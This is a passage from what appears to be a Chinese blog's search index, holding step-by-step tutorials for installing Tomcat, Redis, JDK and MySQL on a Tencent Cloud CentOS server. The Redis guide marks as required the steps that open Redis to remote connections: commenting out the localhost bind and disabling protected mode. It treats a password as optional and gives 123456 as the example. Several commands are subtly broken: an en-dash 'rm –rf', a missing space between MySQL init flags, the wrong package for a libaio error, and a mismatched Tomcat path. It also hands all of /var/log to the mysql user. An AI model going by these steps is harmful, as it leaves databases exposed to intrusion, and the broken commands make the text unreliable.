后会有人工审核仓库内容，如果发现用来做图床，轻则删库，重则封号。因此为了安全起见，建议在 1G 之前就换个仓库，反正可以创建无数个仓库嘛！</li><li>Github 单文件上传的限制为 100M，但是  jsDelivr 加速的单文件大小限制为 50M。因此这也就限制了单张图片大小上限为 50MB。</li><li>jsDelivr+Npm 依然有 100MB 的包大小限制，但是 NPM 有丰富的国内节点。可以挑选一个使用，个人推荐知乎的。</li></ol></div><hr><p class='p center code h4 red'>如有错误，欢迎评论区留言！</p>]]></content>
      
      
      <categories>
          
          <category> Butterfly </category>
          
          <category> 魔改日志文档 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Butterfly </tag>
            
            <tag> 魔改日志文档 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>腾讯云服务器安装Tomcat 8</title>
      <link href="2021/11/17/%E8%85%BE%E8%AE%AF%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85Tomcat%208/"/>
      <url>2021/11/17/%E8%85%BE%E8%AE%AF%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85Tomcat%208/</url>
      
        <content type="html"><![CDATA[<p class='p center logo large'>腾讯云服务器安装Tomcat 8</p><p class='p center small'>腾讯云轻量应用服务器安装Tomcat 8。</p><p><br/></p><div class="tip home"><p>云服务商：腾讯云</p><p>产品：轻量应用云服务器</p><p>系统：CentOS 7.6</p></div><h1 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1.前期准备"></a>1.前期准备</h1><h2 id="1-下载Tomcat-8安装包到本地环境"><a href="#1-下载Tomcat-8安装包到本地环境" class="headerlink" title="1.下载Tomcat 8安装包到本地环境"></a>1.下载Tomcat 8安装包到本地环境</h2><ol><li>下载地址：<a href="https://tomcat.apache.org/download-80.cgi">https://tomcat.apache.org/download-80.cgi</a></li><li>选择自己想要的版本，然后选择tar.gz压缩文件下载。</li><li>选择好版本后进行下载。</li></ol><h2 id="2-上传Tomcat-8安装包到云服务器"><a href="#2-上传Tomcat-8安装包到云服务器" class="headerlink" title="2.上传Tomcat 8安装包到云服务器"></a>2.上传Tomcat 8安装包到云服务器</h2><ol><li><p>使用su命令切换到root用户，以获得足够的操作权限（会提示输入登录密码）</p></li><li><p>在/usr/local路径下新建tomcat目录：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir /usr/local/tomcat</span><br></pre></td></tr></table></figure></li><li><p>使用WinSCP将下载的Tomcat 8安装包上传到刚才新建的tomcat目录</p></li><li><p>查看是否上传成功：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /usr/local/tomcat #跳转到tomcat目录</span><br><span class="line">ls #查看tomcat目录里是否有上传的tomcat安装包</span><br></pre></td></tr></table></figure></li></ol><h1 id="2-安装步骤"><a href="#2-安装步骤" class="headerlink" title="2.安装步骤"></a>2.安装步骤</h1><ol><li><p>使用su命令切换到root用户，以获得足够的操作权限（会提示输入登录密码）</p></li><li><p>跳转到tomcat文件夹</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /usr/local/tomcat</span><br></pre></td></tr></table></figure></li><li><p>解压apache-tomcat-8.5.72安装包</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf apache-tomcat-8.5.72.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>查看是否解压完成</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line"><span class="meta">#</span><span class="bash">发现，除了我们上传的安装包，多了一个apache-tomcat-8.5.72目录</span></span><br></pre></td></tr></table></figure></li><li><p>至此安装完成，删除安装包</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm –rf apache-tomcat-8.5.72.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>tomcat服务的开启与关闭</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">启动tomcat服务</span></span><br><span class="line"><span class="meta">#</span><span class="bash">进入安装bin目录</span></span><br><span class="line">cd /usr/local/tomcat/apache-tomcat-8.5.72/bin</span><br><span class="line"><span class="meta">#</span><span class="bash">启动服务</span></span><br><span class="line">./startup.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">启动之后可以在浏览器输入：服务器外网地址:8080 进行访问（记得打开8080端口的防火墙）</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">停止tomcat服务</span></span><br><span class="line"><span class="meta">#</span><span class="bash">进入安装bin目录</span></span><br><span class="line">cd /usr/local/tomcat/apache-tomcat-8.5.72/bin</span><br><span class="line"><span class="meta">#</span><span class="bash">停止服务</span></span><br><span class="line">./shutdown.sh</span><br></pre></td></tr></table></figure></li><li><p>修改tomcat8默认端口为80</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">我们使用<span class="built_in">cd</span>命令将目录切换到tomcat下的conf目录</span></span><br><span class="line">cd /usr/local/tomcat/apache-tomcat-8.5.40/conf</span><br><span class="line"><span class="meta">#</span><span class="bash">查看目录文件</span></span><br><span class="line">ll #可以看到该目录下，有一个server.xml文件，下面我们就要打开这个文件进行编辑</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">打开server.xml文件</span></span><br><span class="line">vim server.xml</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">按 i 键进入编辑模式，找到&lt;Connector&gt;节点处的：port=<span class="string">&quot;8080&quot;</span>，并将其改为：port=<span class="string">&quot;80&quot;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">之后按esc键回到命令模式，输入下面命令保存并退出：</span></span><br><span class="line">:wq </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>启动Tomcat服务之后可以在浏览器输入：<code>服务器外网地址:80</code> 进行访问（记得打开80端口的防火墙），访问成功则代表已经安装配置成功！</p></li></ol><hr><p class='p center code h4 red'>如有错误，欢迎评论区留言！</p>]]></content>
      
      
      <categories>
          
          <category> 云服务器java环境部署 </category>
          
          <category> Linux(CentOS 7.6) </category>
          
          <category> Tomcat8 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云服务器java环境部署 </tag>
            
            <tag> Linux(CentOS 7.6) </tag>
            
            <tag> Tomcat8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>腾讯云服务器安装Redis5.0.9</title>
      <link href="2021/11/17/%E8%85%BE%E8%AE%AF%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85Redis5.0.9/"/>
      <url>2021/11/17/%E8%85%BE%E8%AE%AF%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85Redis5.0.9/</url>
      
        <content type="html"><![CDATA[<p class='p center logo large'>腾讯云服务器安装Redis5.0.9</p><p class='p center small'>腾讯云轻量应用服务器安装Redis5.0.9。</p><p><br/></p><div class="tip home"><p>云服务商：腾讯云</p><p>产品：轻量应用云服务器</p><p>系统：CentOS 7.6</p></div><h1 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1.前期准备"></a>1.前期准备</h1><h2 id="1-1下载Redis安装包到本地环境"><a href="#1-1下载Redis安装包到本地环境" class="headerlink" title="1.1下载Redis安装包到本地环境"></a>1.1下载Redis安装包到本地环境</h2><ol><li>下载地址：<a href="http://download.redis.io/releases/">http://download.redis.io/releases/</a></li><li>选择需要的版本，我这里选择的是redis-5.0.9.tar.gz版本。</li><li>选择好版本后进行下载。</li></ol><h2 id="1-2上传Redis安装包到云服务器"><a href="#1-2上传Redis安装包到云服务器" class="headerlink" title="1.2上传Redis安装包到云服务器"></a>1.2上传Redis安装包到云服务器</h2><ol><li><p>使用su命令切换到root用户，以获得足够的操作权限（会提示输入登录密码）</p></li><li><p>在/usr/local路径下新建redis目录：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir /usr/local/redis</span><br></pre></td></tr></table></figure></li><li><p>使用WinSCP将下载的redis-5.0.9安装包上传到刚才新建的redis目录</p></li><li><p>查看是否上传成功：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /usr/local/redis #跳转到redis目录</span><br><span class="line">ls #查看redis目录里是否有上传的redis-5.0.9安装包</span><br></pre></td></tr></table></figure></li></ol><h1 id="2-安装步骤"><a href="#2-安装步骤" class="headerlink" title="2.安装步骤"></a>2.安装步骤</h1><ol><li><p>使用su命令切换到root用户，获取更高的操作权限</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su #回车之后会提示输入自己的登录密码</span><br></pre></td></tr></table></figure></li><li><p>跳转到redis文件夹</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /usr/local/redis</span><br></pre></td></tr></table></figure></li><li><p>解压redis-5.0.9安装包</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf redis-5.0.9.tar.gz #替换为自己的安装包名</span><br></pre></td></tr></table></figure></li><li><p>进入到<code>redis的解压目录</code>（即redis源码目录）下，并执行编译</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd redis-5.0.9 &amp;&amp; make</span><br></pre></td></tr></table></figure></li><li><p>安装（指定安装目录）</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make install PREFIX=/usr/local/redis #安装路径可替换为自己的安装路径，安装完成后可在安装目录下看到多了一个bin目录</span><br></pre></td></tr></table></figure></li><li><p>配置</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">从解压的redis源码目录中复制 redis.conf 到 redis 的安装目录</span></span><br><span class="line">cp /usr/local/redis/redis-5.0.9/redis.conf /usr/local/redis/bin/ </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">跳转到安装目录（bin目录）</span></span><br><span class="line">cd /usr/local/redis/bin/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">修改安装目录（bin）下的 redis.conf 配置文件</span></span><br><span class="line">vi redis.conf</span><br></pre></td></tr></table></figure><p>按 i 键进入编辑模式</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">【必选】设置为后台启动：</span><br><span class="line">daemonize no 改为 daemonize yes【修改后：daemonize yes】</span><br><span class="line"></span><br><span class="line">【必选】设置允许远程连接：</span><br><span class="line">注释掉bind 127.0.0.1【修改后：# bind 127.0.0.1】</span><br><span class="line">并且把protected-mode yes 改为 protected-mode no【修改后：protected-mode no】</span><br><span class="line"></span><br><span class="line">【可选】为Redis设置登录密码：</span><br><span class="line">取消注释# requirepass foobared，并设置自己的密码【修改后：requirepass  123456】</span><br></pre></td></tr></table></figure><p>按esc键，退出编辑模式，并输入</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:wq</span><br></pre></td></tr></table></figure><p>保存并退出。</p></li><li><p>Redis服务的启动和关闭</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查看是否启动了Redis服务</span></span><br><span class="line">ps -ef | grep redis</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">启动Redis服务，进入安装的bin目录后输入：</span></span><br><span class="line">./redis-server redis.conf</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">停止Redis服务，进入安装的bin目录后输入：</span></span><br><span class="line">./redis-cli shutdown</span><br></pre></td></tr></table></figure></li><li><p>Redis客户端的连接和退出</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">连接Redis，进入安装的bin目录后输入：</span></span><br><span class="line">./redis-cli</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">退出Redis客户端</span></span><br><span class="line">exit</span><br></pre></td></tr></table></figure></li></ol><hr><p class='p center code h4 red'>如有错误，欢迎评论区留言！</p>]]></content>
      
      
      <categories>
          
          <category> 云服务器java环境部署 </category>
          
          <category> Linux(CentOS 7.6) </category>
          
          <category> Redis5.0.9 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云服务器java环境部署 </tag>
            
            <tag> Linux(CentOS 7.6) </tag>
            
            <tag> Redis5.0.9 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>腾讯云服务器安装JDK1.8</title>
      <link href="2021/11/16/%E8%85%BE%E8%AE%AF%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85JDK1.8/"/>
      <url>2021/11/16/%E8%85%BE%E8%AE%AF%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85JDK1.8/</url>
      
        <content type="html"><![CDATA[<p class='p center logo large'>腾讯云服务器安装JDK1.8</p><p class='p center small'>腾讯云轻量应用服务器安装JDK1.8。</p><p><br/></p><div class="tip home"><p>云服务商：腾讯云</p><p>产品：轻量应用云服务器</p><p>系统：CentOS 7.6</p></div><h1 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1.前期准备"></a>1.前期准备</h1><h2 id="1-下载jdk到本地环境"><a href="#1-下载jdk到本地环境" class="headerlink" title="1.下载jdk到本地环境"></a>1.下载jdk到本地环境</h2><ol><li>下载地址：<a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></li><li>选择Linux x64系统的jdk-8u202-linux-x64版本。</li><li>选择好版本后进行下载(需要Oracle账号登录，注册一个就行)。</li></ol><h2 id="2-上传jdk到云服务器"><a href="#2-上传jdk到云服务器" class="headerlink" title="2.上传jdk到云服务器"></a>2.上传jdk到云服务器</h2><ol><li><p>使用su命令切换到root用户，以获得足够的操作权限（会提示输入登录密码）</p></li><li><p>在/usr/local路径下新建java目录：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir /usr/local/java</span><br></pre></td></tr></table></figure></li><li><p>使用WinSCP将下载的jdk-8u202-linux-x64安装包上传到刚才新建的java目录</p></li><li><p>查看是否上传成功：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /usr/local/java #跳转到java目录</span><br><span class="line">ls #查看java目录里是否有上传的java安装包</span><br></pre></td></tr></table></figure></li></ol><h1 id="2-安装步骤"><a href="#2-安装步骤" class="headerlink" title="2.安装步骤"></a>2.安装步骤</h1><ol><li><p>使用su命令切换到root用户，以获得足够的操作权限（会提示输入登录密码）</p></li><li><p>查询系统自带的openjdk并卸载</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查询系统自带的openjdk</span></span><br><span class="line">rpm -qa | grep jdk </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">把查询出来的所有openjdk相关的包输出到控制台</span></span><br><span class="line">rpm -qa | grep jdk  | xargs</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">批量卸载openjdk</span></span><br><span class="line">yum remove java*</span><br></pre></td></tr></table></figure></li><li><p>跳转到java文件夹</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /usr/local/java</span><br></pre></td></tr></table></figure></li><li><p>解压jdk1.8安装包</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xzvf jdk-8u202-linux-x64.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>配置环境变量，打开/etc/profile文件</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/profile</span><br></pre></td></tr></table></figure><p> 并按 i 键，进入文本编辑模式，在文件最后添加以下环境变量：</p> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#注意:修改export JAVA_HOME&#x3D;自己linux上的jdk存放位置。其他两行不需要修改</span><br><span class="line"></span><br><span class="line">export JAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;java&#x2F;jdk1.8.0_202 </span><br><span class="line">export PATH&#x3D;$JAVA_HOME&#x2F;bin:$PATH</span><br><span class="line">export CLASSPATH&#x3D;.:$JAVA_HOME&#x2F;jre&#x2F;lib&#x2F;rt.jar:$JAVA_HOME&#x2F;lib&#x2F;dt.jar:$JAVA_HOME&#x2F;lib&#x2F;tools.jar</span><br></pre></td></tr></table></figure><p> 按ESC键回到命令模式 ，输入</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:wq</span><br></pre></td></tr></table></figure><p>  保存并退出编辑。</p></li><li><p>让环境变量配置生效，输入：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure></li><li><p>查看是否安装成功，输入：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure><p> 看见jdk版本号便是安装成功（输入javac显示命令信息也是安装成功）。</p></li><li><p>至此，便是成功在Linux系统上安装好jdk。</p></li></ol><hr><p class='p center code h4 red'>如有错误，欢迎评论区留言！</p>]]></content>
      
      
      <categories>
          
          <category> 云服务器java环境部署 </category>
          
          <category> Linux(CentOS 7.6) </category>
          
          <category> jdk1.8 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云服务器java环境部署 </tag>
            
            <tag> Linux(CentOS 7.6) </tag>
            
            <tag> jdk1.8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>腾讯云服务器安装MySQL5.7</title>
      <link href="2021/11/16/%E8%85%BE%E8%AE%AF%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85MySQL5.7/"/>
      <url>2021/11/16/%E8%85%BE%E8%AE%AF%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E8%A3%85MySQL5.7/</url>
      
        <content type="html"><![CDATA[<p class='p center logo large'>腾讯云服务器安装MySQL5.7</p><p class='p center small'>腾讯云轻量应用服务器安装MySQL5.7。</p><p><br/></p><div class="tip home"><p>云服务商：腾讯云</p><p>产品：轻量应用云服务器</p><p>系统：CentOS 7.6</p></div><h1 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1.前期准备"></a>1.前期准备</h1><h2 id="1-下载MySQL5-7安装包到本地环境"><a href="#1-下载MySQL5-7安装包到本地环境" class="headerlink" title="1.下载MySQL5.7安装包到本地环境"></a>1.下载MySQL5.7安装包到本地环境</h2><ol><li>下载地址：<a href="https://dev.mysql.com/downloads/mysql/">https://dev.mysql.com/downloads/mysql/</a></li><li>点击<a href="https://dev.mysql.com/downloads/mysql/5.7.html">Looking for previous GA versions?</a>选择想要的版本。</li><li>选择好版本后进行下载。</li></ol><h2 id="2-上传MySQL5-7安装包到云服务器"><a href="#2-上传MySQL5-7安装包到云服务器" class="headerlink" title="2.上传MySQL5.7安装包到云服务器"></a>2.上传MySQL5.7安装包到云服务器</h2><ol><li><p>使用su命令切换到root用户，以获得足够的操作权限（会提示输入登录密码）</p></li><li><p>在/usr/local路径下新建mysql目录：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir /usr/local/mysql</span><br></pre></td></tr></table></figure></li><li><p>使用WinSCP将下载的MySQL5.7安装包上传到刚才新建的mysql目录</p></li><li><p>查看是否上传成功：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /usr/local/mysql #跳转到mysql目录</span><br><span class="line">ls #查看mysql目录里是否有上传的mysql安装包</span><br></pre></td></tr></table></figure></li></ol><h1 id="2-安装步骤"><a href="#2-安装步骤" class="headerlink" title="2.安装步骤"></a>2.安装步骤</h1><h2 id="1-查看linux下是否有老版本的mysql（有删除）"><a href="#1-查看linux下是否有老版本的mysql（有删除）" class="headerlink" title="1.查看linux下是否有老版本的mysql（有删除）"></a>1.查看linux下是否有老版本的mysql（有删除）</h2><ol><li><p>查找是否有旧的mysql：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -qa | grep mysql</span><br></pre></td></tr></table></figure></li><li><p>卸载（有旧的mysql情况下）：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">卸载命令：rpm –ev &#123;包名&#125;</span></span><br><span class="line">rpm -ev mysql-community-common-5.7.23-1.el7.x86_64</span><br></pre></td></tr></table></figure></li><li><p>查找老版本mysql相关的安装目录命令：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -name mysql</span><br></pre></td></tr></table></figure></li><li><p>删除目录（若查找到相关目录）:</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm –rf &#123;目录名&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="2-查看-linux-下是否安装-mariadb-数据库（有的话需要删除，因为有冲突）"><a href="#2-查看-linux-下是否安装-mariadb-数据库（有的话需要删除，因为有冲突）" class="headerlink" title="2.查看 linux 下是否安装 mariadb 数据库（有的话需要删除，因为有冲突）"></a>2.查看 linux 下是否安装 mariadb 数据库（有的话需要删除，因为有冲突）</h2><ol><li><p>检查是否安装了 mariadb：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -qa | grep mariadb</span><br></pre></td></tr></table></figure></li><li><p>删除mariadb（如果安装了的情况下）：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -e --nodeps mariadb-libs-5.5.52-1.el7.x86_64</span><br></pre></td></tr></table></figure></li></ol><h2 id="3-解压安装"><a href="#3-解压安装" class="headerlink" title="3.解压安装"></a>3.解压安装</h2><ol><li><p>跳转到存放安装包的目录</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /usr/local/mysql</span><br></pre></td></tr></table></figure></li><li><p>解压安装包</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xzvf mysql-5.7.24-linux-glibc2.12-x86_64.tar.gz #替换为自己的安装包名称</span><br></pre></td></tr></table></figure></li><li><p>移动并修改名字，将解压目录里的所有文件剪切到mysql目录：</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mv mysql-5.7.24-linux-glibc2.12-x86_64/* /usr/local/mysql</span><br></pre></td></tr></table></figure></li><li><p>删除解压的目录（此时目录所有文件被剪切到mysql目录，解压的目录为空）</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -rf mysql-5.7.24-linux-glibc2.12-x86_64</span><br></pre></td></tr></table></figure></li><li><p>创建主目录（data:存储目录）</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir /usr/local/mysql/data</span><br></pre></td></tr></table></figure></li><li><p>主目录权限处理(查看是否有就得用户，有删除并新建用户)</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查看组和用户情况：</span></span><br><span class="line">cat /etc/group | grep mysql</span><br><span class="line"><span class="meta">#</span><span class="bash">查看组和用户情况：</span></span><br><span class="line">cat /etc/passwd |grep mysql</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">若存在，则删除原mysql用户：</span></span><br><span class="line">userdel -r mysql #会删除其对应的组和用户并在次查看。</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">创建mysql组：</span></span><br><span class="line">groupadd mysql</span><br><span class="line"><span class="meta">#</span><span class="bash">创建mysql用户：</span></span><br><span class="line">useradd -r -g mysql mysql</span><br><span class="line"><span class="meta">#</span><span class="bash">修改目录拥有者：</span></span><br><span class="line">chown -R mysql:mysql /usr/local/mysql</span><br></pre></td></tr></table></figure></li><li><p>创建配置文件，并配置</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">创建my.cnf文件，并打开</span></span><br><span class="line">vim /etc/my.cnf </span><br></pre></td></tr></table></figure><p>点击 i 键进入编辑模式，将文件模板复制粘贴在my.cnf中，文件模板：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># For advice on how to change settings please see</span><br><span class="line"># http://dev.mysql.com/doc/refman/5.7/en/server-configuration-defaults.html</span><br><span class="line"># *** DO NOT EDIT THIS FILE. It‘s a template which will be copied to the</span><br><span class="line"># *** default location during install, and will be replaced if you</span><br><span class="line"># *** upgrade to a newer version of MySQL.</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line"></span><br><span class="line"># Remove leading # and set to the amount of RAM for the most important data</span><br><span class="line"># cache in MySQL. Start at 70% of total RAM for dedicated server, else 10%.</span><br><span class="line"># innodb_buffer_pool_size = 128M</span><br><span class="line"></span><br><span class="line"># Remove leading # to turn on a very important data integrity option: logging</span><br><span class="line"># changes to the binary log between backups.</span><br><span class="line"># log_bin</span><br><span class="line"></span><br><span class="line"># These are commonly set, remove the # and set as required.</span><br><span class="line"># basedir = .....</span><br><span class="line"># datadir = .....</span><br><span class="line"># port = .....</span><br><span class="line"># server_id = .....</span><br><span class="line"># socket = .....</span><br><span class="line"></span><br><span class="line"># Remove leading # to set options mainly useful for reporting servers.</span><br><span class="line"># The server defaults are faster for transactions and fast SELECTs.</span><br><span class="line"># Adjust sizes as needed, experiment to find the optimal values.</span><br><span class="line"># join_buffer_size = 128M</span><br><span class="line"># sort_buffer_size = 2M</span><br><span class="line"># read_rnd_buffer_size = 2M</span><br><span class="line"></span><br><span class="line">sql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES</span><br></pre></td></tr></table></figure><p>修改配置文件内容，注意要在模板的  [mysqld] 下面去修改（basedir：mysql安装路径，datadir：数据存储目录），修改为：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># For advice on how to change settings please see</span><br><span class="line"># http://dev.mysql.com/doc/refman/5.7/en/server-configuration-defaults.html</span><br><span class="line"># *** DO NOT EDIT THIS FILE. It‘s a template which will be copied to the</span><br><span class="line"># *** default location during install, and will be replaced if you</span><br><span class="line"># *** upgrade to a newer version of MySQL.</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line"></span><br><span class="line"># Remove leading # and set to the amount of RAM for the most important data</span><br><span class="line"># cache in MySQL. Start at 70% of total RAM for dedicated server, else 10%.</span><br><span class="line"># innodb_buffer_pool_size = 128M</span><br><span class="line"></span><br><span class="line"># Remove leading # to turn on a very important data integrity option: logging</span><br><span class="line"># changes to the binary log between backups.</span><br><span class="line"># log_bin</span><br><span class="line"></span><br><span class="line"># These are commonly set, remove the # and set as required.</span><br><span class="line">#=========配置相关路径等信息==========</span><br><span class="line">basedir=/usr/local/mysql</span><br><span class="line">datadir=/usr/local/mysql/data</span><br><span class="line">port = 3306</span><br><span class="line">socket=/tmp/mysql.sock</span><br><span class="line">pid-file=/tmp/mysqld/mysqld.pid</span><br><span class="line">character-set-server = utf8</span><br><span class="line">log-error=/var/log/mysqld.log</span><br><span class="line"></span><br><span class="line"># Remove leading # to set options mainly useful for reporting servers.</span><br><span class="line"># The server defaults are faster for transactions and fast SELECTs.</span><br><span class="line"># Adjust sizes as needed, experiment to find the optimal values.</span><br><span class="line"># join_buffer_size = 128M</span><br><span class="line"># sort_buffer_size = 2M</span><br><span class="line"># read_rnd_buffer_size = 2M</span><br><span class="line"></span><br><span class="line">sql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>按esc键退出回到命令模式，输入：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">:wq</span><br></pre></td></tr></table></figure><p>保存并退出。</p></li><li><p>创建刚才配置相关文件</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">创建文件/tmp/mysql.sock：设置用户组及用户，授权</span></span><br><span class="line">cd /tmp</span><br><span class="line">touch mysql.sock</span><br><span class="line">chown mysql:mysql mysql.sock</span><br><span class="line">chmod 755 mysql.sock</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">创建文件/tmp/mysqld/mysqld.pid</span></span><br><span class="line">mkdir mysqld</span><br><span class="line">cd mysqld</span><br><span class="line">touch mysqld.pid</span><br><span class="line">cd ..</span><br><span class="line">chown -R mysql:mysql mysqld</span><br><span class="line">cd mysqld</span><br><span class="line">chmod 755 mysqld.pid</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">创建文件/var/<span class="built_in">log</span>/mysqld.log：</span></span><br><span class="line">touch /var/log/mysqld.log</span><br><span class="line">chown -R mysql:mysql /var/log</span><br><span class="line">cd /var/log</span><br><span class="line">chmod 755 mysqld.log</span><br></pre></td></tr></table></figure></li><li><p>安装和初始化数据库</p> <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">进入初始化目录：</span></span><br><span class="line">cd /usr/local/mysql/bin/</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">初始化数据库：</span></span><br><span class="line">./mysqld --initialize --user=mysql --basedir=/usr/local/mysql--datadir=/usr/local/mysql/data</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">如果报错：（./mysqld: error <span class="keyword">while</span> loading shared libraries: libaio.so.1: cannot open shared object file: No such file or directory）</span></span><br><span class="line"><span class="meta">#</span><span class="bash">需要安装命令：</span></span><br><span class="line">yum -y install numactl</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">之后在执行初始化数据库：</span></span><br><span class="line">./mysqld --initialize --user=mysql --basedir=/usr/local/mysql--datadir=/usr/local/mysql/data</span><br></pre></td></tr></table></figure></li><li><p>安全启动:</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">进入到bin目录，</span></span><br><span class="line">cd /usr/local/mysql/bin/</span><br><span class="line"><span class="meta">#</span><span class="bash">安全启动</span></span><br><span class="line">./mysqld_safe --user=mysql &amp;</span><br><span class="line"><span class="meta">#</span><span class="bash">查看是否成功：</span></span><br><span class="line">ps -ef | grep mysql</span><br><span class="line"></span><br><span class="line"><span 